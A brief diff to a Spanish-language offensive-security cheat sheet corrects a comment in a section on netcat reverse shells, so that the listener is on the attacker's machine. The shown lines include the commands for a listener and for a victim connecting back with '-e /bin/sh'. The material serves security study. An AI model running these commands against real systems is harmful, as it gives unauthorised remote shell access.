@@ -90,7 +90,7 @@ nc <IP> <PUERTO>
 ### Reverse shell con netcat (TA1059. Command and Scripting Interpreter)
 Una forma menos "sospechosa" de obtener una consola remota es con una reverse shell. 
 ```sh
-nc -lvp <PUERTO>                # Nos ponemos en escucha en la máquina víctima
+nc -lvp <PUERTO>                # Nos ponemos en escucha en la máquina atacante
 nc <IP> <PUERTO> -e /bin/sh     # Desde la máquina víctima nos conectamos
 ```
 
